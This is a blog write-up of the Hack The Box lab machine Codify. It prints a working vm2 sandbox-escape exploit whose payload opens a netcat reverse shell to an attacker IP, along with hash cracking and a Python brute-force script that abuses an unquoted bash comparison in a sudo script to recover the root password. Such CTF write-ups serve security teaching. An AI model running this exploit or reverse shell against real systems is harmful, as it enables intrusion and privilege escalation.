---
date: 2024-04-05T16:50:10-05:00
# description: ""
image: "/images/HTB-Codify/Codify.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Codify"
type: "post"
---

* Platform: Hack The Box
* Link: [Codify](https://app.hackthebox.com/machines/Codify)
* Level: Easy
* OS: Linux
---

Codify starts with a web application that offers a sandbox environment for testing Node.js code. It utilizes the [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) library and employs a module whitelist for security. However, there is a vulnerability ([CVE-2023-3214](https://nvd.nist.gov/vuln/detail/CVE-2023-32314) ) in vm2 that can be exploited to break out of the sandbox and access the target system. This is followed by lateral movement to access another user account and obtain the user flag. Additionally, upon identifying a vulnerability in a script that we can run with elevated privileges, a custom brute force script is employed to obtain the root password.

Target IP address - `10.10.11.239`

## Scanning 

```
nmap -sC -sV -oA nmap/Codify 10.10.11.239
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-21 20:19 CDT
Nmap scan report for 10.10.11.239
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
```

We find three ports open 22 (SSH), 80 (HTTP) and 3000 (Node.js). We are being redirected to `codify.htb` which I added to the `/etc/hosts`.

```
sudo echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The website is a service to test Node.js code in a sandbox environment.

![Codify Website](/images/HTB-Codify/codify-website.png)

Clicking `Try it now` brings up an editor where code can be run.

![Codify Sanbox Environment](/images/HTB-Codify/code-run.png)

The platform uses a module whitelist for security purposes.

![Codify Module Whitelist](/images/HTB-Codify/codify-limitations.png)

In the `About Us` section we learn that the [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) library is used.

![Codify About Section](/images/HTB-Codify/codify-about.png)

## Initial Foothold

Researching for vm2 vulnerabilities, we find [CVE-2023-3214](https://nvd.nist.gov/vuln/detail/CVE-2023-32314) and a PoC can be found [here](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac). The exploit allows us to escape the sandbox and obtain remote code execution (RCE).

After multiple failures, the search for a reverse shell leads to [this](https://www.youtube.com/watch?v=_q_ZCy-hEqg&ab_channel=0xdf) old video of 0xdf where he explains `mkfifo / nc Reverse Shell`. Some mkfifo reverse shells are available [here](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/b76e6441-5999-45e4-949e-bd332cb21cce.xhtml) and the first one ends up working. Below is the complete code.

> Don't forget to change the IP address and port number accordingly.

```Javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.13 9001 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a ").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

Initial access is achieved after running the code in the editor.

![Codify Foothold](/images/HTB-Codify/foothold.png)

The shell can be upgraded by running the commands below.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

### Lateral Movement

Access to the `joshua` directory in `/home` is denied. It is owned by the user `joshua` which is our target for lateral movement.

![Access to Joshua directory denied](/images/HTB-Codify/access-denied.png)

After running `linpeas` on the target, some interesting accessible files are found in the Apache web root directory.

![Files found by linpeas](/images/HTB-Codify/Codify-intersting-files.png)

The file `tickets.db` in `/var/www/contact` contains the password hash for the user `joshua`.

![User josua password hash](/images/HTB-Codify/pwd-hash.png)

`hashid` reveals that it is a Blowfish hash.

![Hashid command results](/images/HTB-Codify/hashid.png)

Using john to crack the hash, the password `spongebob1` is retrieved.

![User Joshua password](/images/HTB-Codify/hash-cracked.png)

With the credentials `joshua:spongebob1` we can login via SSH and get the user flag `user.txt` 

## Privilege Escalation

Running `sudo -l` reveals that the user `joshua` can run the script `mysql-backup.sh` as root.

![Sudo -l command results](/images/HTB-Codify/sudo-l.png)

When we try to execute the script we get the prompt `Enter MySQL password for root:`.

This is the content of the script 

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The image below highlights the script vulnerability. In Bash, if the right side of the `==` operator in a conditional expression (within double square brackets `[[ ... ]]`) is not quoted, Bash performs pattern matching (also known as globbing) rather than interpreting it as a string.

![mysql-backup.sh script vulnerability](/images/HTB-Codify/script-vulnerability.png)

For example if the password is `hello`, both `[[$DB_PASS == hello]]` and `[[$DB_PASS == h*]]` will match because `h*` is a pattern that matches any string starting with the letter `h`. Knowing this, bruteforcing the password becomes a viable solution.

> To fix this, you should quote the variable `$USER_PASS` in the comparison, like so: `if [[ $DB_PASS == "$USER_PASS" ]]; then`. This ensures that the value of `$USER_PASS` is treated as a string, not a pattern.

Below is the Python script I used

```Python
import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

print("[+] initializing bruteforce script...")
print("[+] bruteforce in progress, please wait...")
while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("[+] new character found: "+password)
                        next=1
                        break
                else: next=0
print("[+] process terminated, root password is: "+password)
```

Here’s how it works:

1. It imports the necessary modules: `string` for character sets and `os` for executing system commands. 

2. It defines a character set `chars` that includes all ASCII letters (both lowercase and uppercase) and digits. 
 
3. An empty string password is initialized to store the discovered password characters, and a flag (`next`) to control the loop. 

4. It enters a while loop that continues as long as `next` is 1. Inside this loop:
	* It iterates over each character `i` in `chars`. 
	* For each character, it constructs a command that echoes the current password plus the character `i`, followed by a wildcard `*`, and pipes this to `sudo /opt/scripts/mysql-backup.sh`. The command is executed in a shell and its output is redirected to /dev/null to suppress it.
	* If the command succeeds (i.e., the exit status `errorlevel` is `0`), it means that the current `password` plus the character `i` is a prefix of the actual password. In this case, it appends `i` to password, prints a message to the console, and sets `next` to `1` to continue the loop. 
	* If the command fails (i.e., the exit status `errorlevel` is non-zero), it means that the current `password` plus the character `i` is not a prefix of the actual password. In this case, it sets `next` to `0` to stop the loop after the current iteration.

5. After the loop terminates, it prints a message to the console indicating that the process has terminated and displays the discovered password.

After running the script, the root password is found to be `kljh12k3jhaskjh12kjh3`.

![mysql-backup.sh script vulnerability](/images/HTB-Codify/root-pwd.png)

After switching to `root`, the root flag `root.txt` is found in `/root`.

![mysql-backup.sh script vulnerability](/images/HTB-Codify/root-flag.png)

I enjoyed this challenge especially the code review part because it is one of my weakest skills. Having some scripting/programming knowledge in Bash and Python will always help as a security professional. 

freeCodeCamp has a Bash Scripting Tutorial for Beginners [video](https://www.youtube.com/watch?v=tK9Oc6AEnR4&t=18s&ab_channel=freeCodeCamp.org) on their YouTube channel. If you prefer books [Learning the bash Shell, 3rd Edition](https://www.amazon.com/Learning-bash-Shell-Programming-Nutshell/dp/0596009658) and [The Linux Command Line, 2nd Edition: A Complete Introduction](https://www.amazon.com/Linux-Command-Line-2nd-Introduction/dp/1593279523) are my recommendations.
